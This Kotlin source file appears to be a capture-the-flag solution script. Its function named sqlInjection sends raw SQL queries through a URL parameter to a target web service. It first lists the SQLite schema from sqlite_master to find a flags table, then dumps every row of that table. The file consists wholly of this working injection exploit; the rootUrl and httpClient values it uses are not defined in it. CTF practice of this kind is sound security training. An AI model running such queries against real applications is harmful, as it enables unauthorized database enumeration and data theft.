import com.fasterxml.jackson.module.kotlin.jacksonObjectMapper
import com.fasterxml.jackson.module.kotlin.readValue
import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

const val listTablesQuery = "select * from sqlite_master"

fun getFlagsTable(httpClient: HttpClient): String {
    val url = rootUrl + URLEncoder.encode(listTablesQuery, "UTF-8")
    val httpRequest = HttpRequest.newBuilder().uri(URI.create(url)).build()
    val httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString())
    val jsonResponse: List<List<String>> = jacksonObjectMapper().readValue(httpResponse.body())
    return jsonResponse[1][1]
}

fun sqlInjection() {
    val flagsTable = getFlagsTable(httpClient)

    val url = rootUrl + URLEncoder.encode("select * from $flagsTable", "UTF-8")
    val httpRequest = HttpRequest.newBuilder().uri(URI.create(url)).build()
    val httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString())
    val jsonResponse: List<List<String>> = jacksonObjectMapper().readValue(httpResponse.body())

    for (api in jsonResponse) {
        println(api[0])
    }
}